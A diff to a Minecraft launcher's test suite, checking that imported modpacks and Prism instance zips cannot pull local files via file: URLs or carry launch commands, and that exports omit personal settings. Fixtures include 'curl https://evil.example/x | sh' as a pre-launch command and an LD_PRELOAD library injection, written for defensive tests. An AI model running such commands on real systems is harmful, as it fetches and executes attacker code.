@@ -41,7 +41,8 @@ test.before(async () => {
   modpacks = new Modpacks({ ctxProvider: () => ctx, instances, tasks, appConfig: cfg, emit: () => {} });
 });
 
-test.after(() => fsp.rm(tmp, { recursive: true, force: true }));
+// Windows can still hold a file of the last import or export for a moment: retry
+test.after(() => fsp.rm(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 }));
 
 test('search: modrinth, curseforge and both (deduplicated)', async () => {
   const mr = await platforms.search({ source: 'modrinth', type: 'mod', query: '' });
@@ -201,6 +202,52 @@ test('export mrpack and re-import it', async () => {
   assert.equal(cfgFile.get('uuid', ''), '');
 });
 
+// A .mrpack lists where each file comes from. Only HTTPS addresses count
+// (Modrinth's format asks for them): a file: address would copy any file of
+// this computer into the profile, and on Windows a file://server/share one
+// would connect to that server and hand it the person's credentials.
+test('mrpack: only HTTPS downloads, tried in order, checked with the best hash', async () => {
+  const secret = path.join(tmp, 'secret.txt');
+  await fsp.writeFile(secret, 'not for the pack');
+  const good = Buffer.from('mirror jar');
+  const sha512 = require('node:crypto').createHash('sha512').update(good).digest('hex');
+  const routes = {
+    'https://broken.example/a.jar': { status: 404 },
+    'https://mirror.example/a.jar': { body: good },
+    'https://cdn.example/b.jar': { body: Buffer.from('changed in transit') },
+  };
+  const index = {
+    formatVersion: 1,
+    game: 'minecraft',
+    versionId: '1',
+    name: 'Hostile pack',
+    dependencies: { minecraft: '26.2', 'fabric-loader': '0.16.0' },
+    files: [
+      { path: 'config/leak.txt', downloads: [require('node:url').pathToFileURL(secret).href], hashes: {} },
+      { path: 'mods/a.jar', downloads: ['https://broken.example/a.jar', 'https://mirror.example/a.jar'], hashes: { sha1: '0'.repeat(40), sha512 } },
+      { path: 'mods/b.jar', downloads: ['https://cdn.example/b.jar'], hashes: { sha512: 'f'.repeat(128) } },
+    ],
+  };
+  const file = path.join(tmp, 'hostile.mrpack');
+  await require('../src/main/util/zip').writeZip(file, [{ name: 'modrinth.index.json', buffer: Buffer.from(JSON.stringify(index)) }]);
+  http.setFetch(async (url, opts) => {
+    const r = routes[url];
+    if (r) return new Response(r.body || null, { status: r.status || 200 });
+    return mock.fetch(url, opts);
+  });
+  try {
+    const r = await modpacks.importArchive(file, {});
+    const inst = await instances.get(r.id);
+    assert.ok(!fs.existsSync(path.join(inst.gameDir, 'config', 'leak.txt')), 'a file: address must not copy a local file');
+    // the first address failed, the mirror worked, and its sha512 (not the wrong sha1) decided
+    assert.equal(fs.readFileSync(path.join(inst.gameDir, 'mods', 'a.jar'), 'utf8'), 'mirror jar');
+    assert.ok(!fs.existsSync(path.join(inst.gameDir, 'mods', 'b.jar')), 'a file that does not match its hash is not kept');
+    assert.deepEqual(r.failed.map((f) => f.title).sort(), ['config/leak.txt', 'mods/b.jar']);
+  } finally {
+    http.setFetch(mock.fetch);
+  }
+});
+
 test('meta: versions and loaders from Prism meta', async () => {
   const meta = new Meta(path.join(tmp, 'cache'), () => '');
   const mc = await meta.minecraftVersions();
@@ -213,4 +260,155 @@ test('meta: versions and loaders from Prism meta', async () => {
   assert.ok(neo.every((v) => v.version.startsWith('26.3')));
   const loaders = await meta.loadersFor('26.2');
   assert.ok(loaders.includes('fabric'));
+});
+
+// A Prism instance someone exported can bring settings that run something on
+// this computer when the game starts. They are listed before importing it, and
+// stay only if the person chooses so.
+test('prism zip: settings that run something are found, and dropped unless kept', async () => {
+  const { riskyLaunchSettings } = require('../src/main/prism/launchsettings');
+  const cfg = [
+    '[General]',
+    'ConfigVersion=1.3',
+    'InstanceType=OneSix',
+    'name=Shared',
+    'OverrideCommands=true',
+    'PreLaunchCommand=curl https://evil.example/x | sh',
+    'OverrideJavaArgs=true',
+    'JvmArgs=-Xmx4G -javaagent:agent.jar',
+    'OverrideEnv=true',
+    'Env="{\\"LD_PRELOAD\\":\\"/tmp/x.so\\",\\"MESA_GL_VERSION_OVERRIDE\\":\\"4.5\\"}"',
+    'OverrideMemory=true',
+    'MaxMemAlloc=4096',
+  ].join('\n');
+  const file = path.join(tmp, 'shared-instance.zip');
+  await require('../src/main/util/zip').writeZip(file, [
+    { name: 'Shared/instance.cfg', buffer: Buffer.from(cfg) },
+    { name: 'Shared/mmc-pack.json', buffer: Buffer.from(JSON.stringify({ formatVersion: 1, components: [{ uid: 'net.minecraft', version: '26.2' }] })) },
+  ]);
+  const found = await modpacks.archiveLaunchSettings(file);
+  assert.deepEqual(found.map((f) => f.key), ['PreLaunchCommand', 'JvmArgs', 'Env LD_PRELOAD']);
+
+  // without an answer (or "drop"): imported without them, the rest stays
+  const dropped = await modpacks.importArchive(file, {});
+  const c1 = await IniFile.load(path.join((await instances.get(dropped.id)).root, 'instance.cfg'));
+  assert.deepEqual(riskyLaunchSettings(c1), []);
+  assert.equal(c1.get('PreLaunchCommand', ''), '');
+  assert.equal(String(c1.get('MaxMemAlloc')), '4096');
+  assert.match(String(c1.get('Env')), /MESA_GL_VERSION_OVERRIDE/);
+  assert.doesNotMatch(String(c1.get('Env')), /LD_PRELOAD/);
+
+  // "keep": as it came
+  const kept = await modpacks.importArchive(file, { launchSettings: 'keep' });
+  const c2 = await IniFile.load(path.join((await instances.get(kept.id)).root, 'instance.cfg'));
+  assert.equal(riskyLaunchSettings(c2).length, 3);
+
+  // modpacks have no instance.cfg: nothing to ask
+  const mr = path.join(tmp, 'fo.mrpack');
+  if (fs.existsSync(mr)) assert.deepEqual(await modpacks.archiveLaunchSettings(mr), []);
+});
+
+// Sharing a profile as a Prism .zip: its commands, its own Java and its
+// environment variables are this computer's (and can hold tokens), so they are
+// left out unless the person chooses to share them.
+test('prism zip export: commands, Java and variables of this computer stay out unless shared', async () => {
+  const { riskyLaunchSettings } = require('../src/main/prism/launchsettings');
+  // a profile with some of its own
+  const created = await modpacks.importArchive(path.join(tmp, 'shared-instance.zip'), { launchSettings: 'keep' });
+  const root = (await instances.get(created.id)).root;
+  const own = await IniFile.load(path.join(root, 'instance.cfg'));
+  own.set('OverrideJavaLocation', true);
+  own.set('JavaPath', '/home/someone/jdks/21/bin/java');
+  own.set('Env', JSON.stringify({ LD_PRELOAD: '/tmp/x.so', GITHUB_TOKEN: 'ghp_secret' }));
+  await own.save();
+  assert.deepEqual((await modpacks.exportSettings(created.id)).map((f) => f.key), ['PreLaunchCommand', 'JavaPath', 'JvmArgs', 'Env LD_PRELOAD', 'Env GITHUB_TOKEN']);
+  const cfgOf = async (zipFile) => {
+    const names = await require('../src/main/util/zip').listEntries(zipFile);
+    return new IniFile((await require('../src/main/util/zip').readEntry(zipFile, names.find((n) => /(^|\/)instance\.cfg$/.test(n)))).toString('utf8'));
+  };
+  // by default: none of them, the rest of the settings stay
+  const out = path.join(tmp, 'export-drop.zip');
+  await modpacks.exportZip(created.id, out, {});
+  const c1 = await cfgOf(out);
+  assert.deepEqual(riskyLaunchSettings(c1), []);
+  assert.equal(c1.get('JavaPath', ''), '');
+  assert.doesNotMatch(String(c1.get('Env', '')), /GITHUB_TOKEN|LD_PRELOAD/);
+  assert.equal(String(c1.get('MaxMemAlloc')), '4096');
+  assert.match(fs.readFileSync(path.join(root, 'instance.cfg'), 'utf8'), /ghp_secret/, 'the profile itself is not changed');
+  // shared on purpose: as they are
+  const kept = path.join(tmp, 'export-keep.zip');
+  await modpacks.exportZip(created.id, kept, { personalSettings: 'keep' });
+  assert.match(String((await cfgOf(kept)).get('Env', '')), /ghp_secret/);
+});
+
+// A modpack that brings its own options.txt replaces the one Havi Hub wrote
+// with the person's key bindings. With keys of its own, the person is asked
+// ('modpack:keys'); without them, the person's are applied on top.
+test('modpack keys: asked when the pack brings its own, applied when it does not', async () => {
+  const events = [];
+  const mp = new Modpacks({ ctxProvider: () => ctx, instances, tasks, appConfig: cfg, emit: (ch, x) => events.push([ch, x]) });
+  const before = cfg.get().inGameDefaults;
+  await cfg.replaceKey('inGameDefaults', { ...before, enabled: true, keys: { 'key.drop': 'key.keyboard.g' } });
+  const pack = async (name, options) => {
+    const file = path.join(tmp, `${name}.mrpack`);
+    const index = { formatVersion: 1, game: 'minecraft', versionId: '1', name, dependencies: { minecraft: '26.2', 'fabric-loader': '0.20.1' }, files: [] };
+    const items = [{ name: 'modrinth.index.json', buffer: Buffer.from(JSON.stringify(index)) }];
+    if (options !== null) items.push({ name: 'overrides/options.txt', buffer: Buffer.from(options) });
+    await require('../src/main/util/zip').writeZip(file, items);
+    return file;
+  };
+  const optionsOf = async (id) => fs.readFileSync(path.join((await instances.get(id)).gameDir, 'options.txt'), 'utf8');
+  try {
+    // the pack's own keys: asked, nothing changed yet
+    const a = await mp.installMrpack(await pack('Keys pack', 'fov:0.0\nkey_key.drop:key.keyboard.q\n'), {});
+    assert.equal(a.keys, 'ask');
+    assert.deepEqual(events.filter(([ch]) => ch === 'modpack:keys').map(([, x]) => [x.id, x.name]), [[a.id, 'Keys pack']]);
+    assert.match(await optionsOf(a.id), /key_key\.drop:key\.keyboard\.q/);
+    // the person chose theirs: their keys, the pack's other options stay
+    assert.equal(await instances.applyKeysTo(a.id), true);
+    const after = await optionsOf(a.id);
+    assert.match(after, /key_key\.drop:key\.keyboard\.g/);
+    assert.match(after, /fov:0\.0/);
+    // options without keys: the person's are applied, nobody is asked
+    events.length = 0;
+    const b = await mp.installMrpack(await pack('Options pack', 'fov:0.5\n'), {});
+    assert.equal(b.keys, 'applied');
+    assert.equal(events.filter(([ch]) => ch === 'modpack:keys').length, 0);
+    assert.match(await optionsOf(b.id), /key_key\.drop:key\.keyboard\.g/);
+    // no options.txt in the pack: the one Havi Hub wrote stays, nothing to ask
+    const c = await mp.installMrpack(await pack('Plain pack', null), {});
+    assert.equal(c.keys, null);
+    assert.match(await optionsOf(c.id), /key_key\.drop:key\.keyboard\.g/);
+    // no keys of the person's own: nothing to ask
+    await cfg.replaceKey('inGameDefaults', { ...before, enabled: true, keys: {} });
+    const d = await mp.installMrpack(await pack('Keys pack 2', 'key_key.drop:key.keyboard.q\n'), {});
+    assert.equal(d.keys, null);
+  } finally {
+    await cfg.replaceKey('inGameDefaults', before);
+  }
+});
+
+// Minecraft upgrades an options.txt from its "version:" line; with none it
+// runs the upgrade for pre-1.13 numeric keys, which fails on
+// "key.keyboard.g" and throws the whole file away. Havi Hub's files say they
+// are current; one the game saved keeps its own version.
+test('options.txt written by Havi Hub says which version it is', async () => {
+  const before = cfg.get().inGameDefaults;
+  await cfg.replaceKey('inGameDefaults', { ...before, enabled: true, keys: { 'key.drop': 'key.keyboard.g' } });
+  try {
+    const id = await instances.create({ name: 'Options version', mcVersion: '26.2', loader: 'fabric', loaderVersion: '0.20.1' });
+    const file = path.join((await instances.get(id)).gameDir, 'options.txt');
+    const lines = fs.readFileSync(file, 'utf8').split('\n');
+    assert.equal(lines[0], 'version:999999');
+    assert.ok(lines.includes('key_key.drop:key.keyboard.g'));
+    // a file the game saved: its version stays
+    fs.writeFileSync(file, 'version:4440\nfov:0.0\nkey_key.drop:key.keyboard.q\n');
+    assert.equal(await instances.applyKeysTo(id), true);
+    const after = fs.readFileSync(file, 'utf8');
+    assert.match(after, /^version:4440$/m);
+    assert.doesNotMatch(after, /999999/);
+    assert.match(after, /^key_key\.drop:key\.keyboard\.g$/m);
+  } finally {
+    await cfg.replaceKey('inGameDefaults', before);
+  }
 });
